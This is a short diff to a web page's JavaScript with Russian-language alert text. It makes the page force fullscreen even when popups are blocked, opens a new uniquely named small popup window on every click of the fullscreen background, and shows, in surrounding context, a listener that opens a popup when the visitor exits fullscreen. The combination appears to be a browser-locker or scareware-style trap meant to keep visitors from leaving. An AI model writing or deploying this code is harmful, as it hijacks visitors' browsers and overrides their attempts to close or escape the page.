@@ -281,12 +281,13 @@
             // Check for popup blocker
             const popupCheck = window.open('', 'popupCheck', 'width=1,height=1');
             if (!popupCheck || popupCheck.closed || typeof popupCheck.closed === 'undefined') {
+                // Show alert but DON'T stop the function
                 alert('Пожалуйста, разрешите всплывающие окна для этого сайта, чтобы продолжить.');
-                return;
+            } else {
+                popupCheck.close();
             }
-            popupCheck.close();
 
-            // Start session and go fullscreen
+            // Start session and go fullscreen (this will now always run)
             startSession();
             requestFullScreenMode();
             fullscreenContent.style.display = 'block';
@@ -308,6 +309,13 @@
             }
         }
 
+        // Listener for clicks on the fullscreen background
+        fullscreenContent.addEventListener('click', function() {
+            if (!isMobileDevice) {
+                window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
+            }
+        });
+        
         // Listener for fullscreen state changes (e.g., pressing Escape)
         document.addEventListener('fullscreenchange', function() {
             // If fullscreen is exited, but the menu content is visible, open a popup
